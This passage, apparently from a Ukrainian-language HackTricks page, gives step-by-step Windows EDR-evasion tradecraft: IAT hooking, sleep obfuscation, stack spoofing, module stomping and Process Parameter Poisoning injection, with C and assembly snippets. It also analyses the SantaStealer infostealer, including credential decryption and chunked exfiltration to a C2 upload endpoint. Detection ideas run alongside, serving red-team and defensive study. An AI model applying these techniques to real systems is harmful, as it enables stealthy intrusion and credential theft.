- Застосовуйте патч після relocations/ASLR і до першого використання імпорту. Reflective loaders на кшталт TitanLdr/AceLdr демонструють hooking під час DllMain завантаженого модуля.
- Робіть wrappers малими й безпечними для PIC; визначайте справжній API через початкове значення IAT, збережене до патчингу, або через LdrGetProcedureAddress.
- Використовуйте переходи RW → RX для PIC і не залишайте сторінки одночасно доступними для запису та виконання.

Call-stack spoofing stub
- PIC-stubs у стилі Draugr створюють фальшивий ланцюжок викликів (return addresses у benign modules), а потім передають керування справжньому API.
- Це обходить detections, які очікують canonical stacks від Beacon/BOFs до sensitive APIs.
- Поєднуйте це з техніками stack cutting/stack stitching, щоб опинитися всередині очікуваних frames перед прологом API.

Operational integration
- Додавайте reflective loader на початок post-ex DLLs, щоб PIC і hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації target APIs, щоб Beacon і BOFs прозоро отримували переваги того самого evasion path без змін коду.

Detection/DFIR considerations
- IAT integrity: entries, що вказують на non-image (heap/anon) addresses; періодична перевірка import pointers.
- Stack anomalies: return addresses, що не належать loaded images; раптові переходи до non-image PIC; невідповідна RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes до IAT, рання активність DllMain, яка змінює import thunks, неочікувані RX regions, створені під час завантаження.
- Image-load evasion: якщо hooking LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, пов’язані з memory masking events.

Related building blocks and examples
- Reflective loaders, що виконують IAT patching під час завантаження (наприклад, TitanLdr, AceLdr)
- Memory masking hooks (наприклад, simplehook) і stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (наприклад, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Якщо ви контролюєте reflective loader, можна виконати hooking imports **під час** `ProcessImports()`, замінивши pointer loader's `GetProcAddress` на custom resolver, який спочатку перевіряє hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **resident PICO** (persistent PIC object), який зберігається після того, як transient loader PIC звільняє себе.
- Експортуйте функцію `setup_hooks()`, яка перезаписує import resolver loader (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте ordinal imports і використовуйте hash-based hook lookup на кшталт `__resolve_hook(ror13hash(name))`. Якщо hook існує, повертайте його; інакше передавайте керування справжньому `GetProcAddress`.
- Реєструйте hook targets під час link time за допомогою Crystal Palace entries `addhook "MODULE$Func" "hook"`. Hook залишається чинним, оскільки розташований усередині resident PICO.

Це забезпечує **import-time IAT redirection** без patching code section завантаженої DLL після завантаження.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks спрацьовують лише тоді, коли функція фактично присутня в IAT target. Якщо модуль резолвить APIs через PEB-walk + hash (без import entry), примусово додайте справжній import, щоб loader's `ProcessImports()` path його побачив:

- Замініть hashed export resolution (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання на кшталт `&WaitForSingleObject`.
- Компілятор створить IAT entry, що дасть змогу виконати interception, коли reflective loader резолвить imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Замість patching `Sleep` виконуйте hooking **фактичних wait/IPC primitives**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалих очікувань обгорніть виклик у Ekko-style obfuscation chain, яка шифрує in-memory image під час idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer` для планування послідовності callbacks, які викликають `NtContinue` із підготовленими `CONTEXT` frames.
- Типовий chain (x64): змінити image на `PAGE_READWRITE` → виконати RC4 encryption через `advapi32!SystemFunction032` над усім mapped image → виконати blocking wait → RC4 decryption → **відновити per-section permissions**, проходячи PE sections → подати сигнал про завершення.
- `RtlCaptureContext` надає шаблон `CONTEXT`; клонуйте його в кілька frames і встановлюйте registers (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Operational detail: повертайте “success” для тривалих очікувань (наприклад, `WAIT_OBJECT_0`), щоб caller продовжив виконання, поки image masked. Цей pattern приховує модуль від scanners під час idle windows і не має класичної сигнатури “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Сплески callbacks `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` над великими contiguous buffers розміром із image.
- `VirtualProtect` для великих діапазонів із подальшим custom per-section permission restoration.

### Runtime CFG registration for sleep-obfuscation gadgets

У CFG-enabled targets перший непрямий jump до mid-function gadget, такого як `jmp [rbx]` або `jmp rdi`, зазвичай призведе до падіння процесу з `STATUS_STACK_BUFFER_OVERRUN`, оскільки gadget відсутній у CFG metadata модуля. Щоб Ekko/Kraken-style chains продовжували працювати всередині hardened processes:<sup>[[30]](#references)</sup>

- Реєструйте кожен indirect destination, який використовує chain, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і entries `CFG_CALL_TARGET_VALID`.
- Для addresses усередині loaded images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **image base** і охоплювати **повний image size**.
- Для manually mapped/PIC/stomped regions використовуйте **allocation base** і **allocation size**.
- Позначайте не лише dispatch gadget, а й exports, до яких здійснюється непрямий перехід (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), а також будь-які attacker-controlled executable sections, які стануть indirect targets.

Це перетворює sleep chains у стилі ROP/JOP із “працює лише в non-CFG processes” на reusable primitive для `explorer.exe`, browsers, `svchost.exe` та інших endpoints, скомпільованих із `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Повна заміна `CONTEXT` є помітною і може порушувати роботу в CET Shadow Stack systems, оскільки spoofed `Rip` все одно має відповідати hardware shadow stack. Безпечніший sleep-masking pattern:<sup>[[30]](#references)</sup>

- Виберіть інший thread у тому самому process і прочитайте bounds його `NT_TIB` / TEB stack (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Створіть backup справжнього TEB/TIB поточного thread.
- Capture-ніть справжній sleeping context через `GetThreadContext`.
- Скопіюйте **лише справжній `Rip`** у spoof context, залишивши spoofed `Rsp`/stack state без змін.
- Під час sleep window скопіюйте spoof thread's `NT_TIB` у current TEB, щоб stack walkers виконували unwind усередині legitimate stack range.
- Після завершення wait відновіть оригінальні TIB і thread context.

Це зберігає CET-consistent instruction pointer і водночас вводить в оману EDR stack walkers, які довіряють TEB stack metadata для перевірки unwinds.

### APC-based alternative: Kraken Mask

Якщо timer-queue dispatch має надто характерну signature, ту саму sleep-encrypt-spoof-restore sequence можна виконати з suspended helper thread за допомогою queued APCs:<sup>[[27]](#references)</sup>

- Створіть helper thread із `NtTestAlert` як entrypoint.
- Queue-те підготовлені `CONTEXT` frames/APCs через `NtQueueApcThread` і drain-те їх через `NtAlertResumeThread`.
- Зберігайте chain state у heap, а не в helper stack, щоб не вичерпати стандартний 64 KB thread stack.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати сигнал start event і заблокуватися.
- Призупиніть main thread перед відновленням TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), щоб зменшити race window, у якому scanner міг би побачити частково відновлений stack.

Це замінює signature `CreateTimerQueueTimer` + `NtContinue` на helper-thread/APC signature, зберігаючи ті самі цілі RC4 masking і stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` незадовго до sleeps, waits або APC dispatch.
- `GetThreadContext`/`SetThreadContext`, обгорнуті навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- `NtQueryInformationThread`, після якого виконуються direct writes у stack bounds TEB/TIB поточного thread.
- Chains `NtQueueApcThread`/`NtAlertResumeThread`, які опосередковано досягають `SystemFunction032`, `VirtualProtect` або helpers для section-permission restoration.
- Повторне використання коротких gadget signatures, таких як `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`), як dispatch pivots усередині signed modules.


## Precision Module Stomping

Module stomping виконує payload із **`.text` section DLL, уже mapped усередині target process**, замість виділення очевидної private executable memory або завантаження нової sacrificial DLL. Target для overwrite має бути **loaded, disk-backed image**, code space якого може вмістити payload без пошкодження code paths, які процес усе ще потребує.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

Naive stomping проти поширених modules на кшталт `uxtheme.dll` або `comctl32.dll` є ненадійним: DLL може бути не завантажена у remote process, а надто мала code region призведе до падіння процесу. Надійніший workflow:

1. Перелічіть modules target process і залиште **names-only include list** DLL, які вже завантажені.
2. Спочатку побудуйте payload і зафіксуйте його **точний розмір у байтах**.
3. Проскануйте candidate DLLs на диску та порівняйте PE section **`.text` `Misc_VirtualSize`** із розміром payload. Це важливіше за file size, оскільки відображає розмір executable section **після mapping у memory**.
4. Розберіть **Export Address Table (EAT)** і виберіть exported function RVA як stomp start offset.
5. Розрахуйте **blast radius**: якщо payload перевищує межу вибраної function, він перезапише сусідні exports, розташовані після неї в memory.

Типові recon/selection helpers, які зустрічаються у wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Операційні примітки
- Надавайте перевагу DLL, які **вже завантажені** у віддалений процес, щоб уникнути телеметрії `LoadLibrary`/неочікуваних завантажень образів.
- Надавайте перевагу export, які цільовий застосунок виконує рідко; інакше звичайні шляхи виконання можуть звернутися до перезаписаних байтів до або після створення потоку.
- Великі імпланти часто потребують зміни способу вбудовування shellcode: замість рядкового літерала слід використовувати **масив байтів/ініціалізатор у фігурних дужках**, щоб повний буфер коректно представлявся у вихідному коді інжектора.

Ідеї для виявлення
- Віддалений запис у **виконувані сторінки, що підтримуються образом** (`MEM_IMAGE`, `PAGE_EXECUTE*`) замість більш поширених приватних виділень RWX/RX.
- Точки входу export, чиї байти в пам’яті більше не відповідають резервному файлу на диску.
- Віддалені потоки або переходи контексту, які починають виконання всередині легітимного export DLL, чиї перші байти нещодавно було змінено.
- Підозрілі послідовності `VirtualProtect(Ex)` / `WriteProcessMemory`, спрямовані на сторінки `.text` DLL, після яких створюється потік.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) — це техніка **process-injection / EDR-evasion**, яка уникає класичного шляху віддаленого запису (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання байтів у вже запущений цільовий процес вона використовує той факт, що Windows **копіює вибрані параметри запуску `CreateProcessW` у дочірній процес** і зберігає їх у `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Носії, які можна отруїти та які копіює `CreateProcessW`

Корисні носії:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (з `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження носіїв:

- `lpCommandLine` має вказувати на **доступну для запису пам’ять** для `CreateProcessW` і обмежується **32 767 символами Unicode**, включно з нульовим термінатором.
- `lpEnvironment` має бути блоком середовища Unicode з послідовними рядками `NAME=VALUE\0`, завершеними додатковим `\0`.
- `lpReserved` офіційно зарезервований, тому відображення `ShellInfo` слід розглядати як деталь реалізації, а не як стабільний документований контракт.

Це перетворює звичайне створення процесу на **примітив передавання payload**. Оператор створює дочірній процес із контрольованими зловмисником даними запуску та дозволяє Windows виконати міжпроцесне копіювання.

### Потік віддаленого пошуку без API віддаленого запису

Після створення дочірнього процесу знайдіть скопійований буфер за допомогою примітивів, доступних лише для читання:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримати `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитати віддалений `PEB`
3. Перейти за `PEB.ProcessParameters`
4. Прочитати `RTL_USER_PROCESS_PARAMETERS`
5. Використати вибраний вказівник:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Мінімальний потік:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не executable. Типовий ланцюжок P3:

1. Створити process звичайним способом (не suspended)
2. Зробити вибрану сторінку параметрів executable за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати handle головного thread, уже повернутий у `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних workflow для thread hijacking, це **не потребує** `SuspendThread` / `ResumeThread`; context можна змінити безпосередньо через handle повернутого головного thread.

Це дає змогу уникнути кількох API, які зазвичай відстежуються під час injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження нульових байтів і staged shellcode

Усі три carriers є **рядковими або подібними до рядків даними**, тому raw payload, що містить `0x00`, обрізається під час transfer. Практичний workaround — **null-free first stage**, який відновлює constants під час runtime, а потім завантажує довільний second stage.

Простий pattern — XOR-based synthesis constants:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Це дає змогу першому етапу формувати stack strings, API arguments, DLL paths або shellcode loader другого етапу без вбудовування null bytes у параметр, що передається.

### Stack-based API calls from the first stage

Коли першому етапу потрібно викликати такі API, як `LoadLibraryA`, він може:

- помістити string/buffer у stack цільового процесу
- зарезервувати **32-byte x64 shadow space**
- встановити `RCX`, `RDX`, `R8`, `R9` у constants або pointers відносно `RSP`
- підтримувати **16-byte alignment** `RSP` перед викликом

Після цього другий етап можна скопіювати зі stack у виділену область `PAGE_READWRITE`, змінити її на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і передати їй керування, уникаючи прямого виділення RWX.

### Detection ideas

Наведені авторами перспективні напрямки для hunting:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, які роблять **process-parameter pages executable**
- за цією зміною захисту — виклик `SetThreadContext` / `NtSetContextThread`
- remote reads із `PEB`, а потім із `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі / high-entropy значення `lpCommandLine`, `lpEnvironment` або `STARTUPINFO.lpReserved` під час створення процесу

### Notes

- P3 — це **cross-process transfer trick**, а не повний execution primitive сам по собі: скопійованому параметру все ще потрібні зміна execute permissions і метод перенаправлення виконання.
- `RtlCreateProcessReflection` / Dirty Vanity розглядалися авторами, але були відхилені, оскільки всередині використовують такі підозрілі primitives, як `NtWriteVirtualMemory` і `NtCreateThreadEx`.

## Tradecraft SantaStealer для Fileless Evasion і Credential Theft

SantaStealer (також відомий як BluelineStealer) демонструє, як сучасні info-stealers поєднують AV bypass, anti-analysis і credential access в одному workflow.<sup>[[24]](#references)</sup>

### Keyboard layout gating & sandbox delay

- Прапорець конфігурації (`anti_cis`) перелічує встановлені keyboard layouts через `GetKeyboardLayoutList`. Якщо знайдено Cyrillic layout, sample створює порожній маркер `CIS` і завершує роботу до запуску stealers, гарантуючи, що він ніколи не detonates у виключених locales, водночас залишаючи hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Багаторівнева логіка `check_antivm`

- Варіант A проходить список процесів, хешує кожне ім’я за допомогою спеціального rolling checksum і порівнює його з вбудованими blocklists для debugger/sandbox; він повторно обчислює checksum для імені комп’ютера та перевіряє робочі каталоги, такі як `C:\analysis`.
- Варіант B перевіряє системні властивості (мінімальну кількість процесів, нещодавній час роботи), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує timing checks навколо sleep, щоб виявити single-stepping. За будь-якого збігу виконання переривається до запуску модулів.

### Безфайловий helper + подвійне reflective loading із ChaCha20

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або вручну мапиться в пам’ять; у fileless mode він самостійно розв’язує imports/relocations, тому артефакти helper не записуються.
- Цей helper зберігає DLL другого етапу, двічі зашифровану за допомогою ChaCha20 (два 32-байтові ключі + 12-байтові nonce). Після обох проходів він reflectively завантажує blob (без `LoadLibrary`) і викликає exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Рутини ChromElevator використовують direct-syscall reflective process hollowing для ін’єкції в активний Chromium browser, успадковують ключі AppBound Encryption і розшифровують passwords/cookies/credit cards безпосередньо з SQLite databases, попри hardening ABE.


### Модульний збір у пам’яті та chunked HTTP exfil

- `create_memory_based_log` перебирає глобальну таблицю function-pointer `memory_generators` і створює по одному thread для кожного увімкненого модуля (Telegram, Discord, Steam, screenshots, documents, browser extensions тощо). Кожен thread записує результати у спільні buffers і повідомляє кількість зібраних файлів після вікна очікування join тривалістю приблизно 45 с.
- Після завершення все стискається статично підключеною бібліотекою `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` очікує 15 с і передає archive частинами по 10 МБ через HTTP POST на `http://<C2>:6767/upload`, маскуючи browser boundary `multipart/form-data` (`----WebKitFormBoundary***`). До кожної частини додаються `User-Agent: upload`, `auth: <build_id>`, необов’язковий `w: <campaign_tag>`, а до останньої частини додається `complete: true`, щоб C2 знав, що reassembly завершено.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, більше жодних поблажок для malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Новий ланцюг зараження та обфускація на основі ConfuserEx для DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Чи варто довіряти своєму zero trust? Обхід posture checks Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – До ToolShell: дослідження попередніх ransomware-операцій Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: зловживання Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Інвентаризація Forwarded Exports у Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – порядок пошуку Dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – безпека процесів і права доступу](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – довідник EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Запускач CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – протидія EDR за допомогою Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – злам захисної оболонки Windows Defender за допомогою Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – довідник команди mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: від RAT до Builder і Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: новий амбітний Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – розшифрування Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: протидія Node.js malware за допомогою API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: присипляння Adaptix за допомогою Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET і Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Обфускація sleep за допомогою Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – приховування Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – зловживання Chrome Remote Desktop під час Red Team Operations: практичний посібник](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
{{#include ../banners/hacktricks-training.md}}
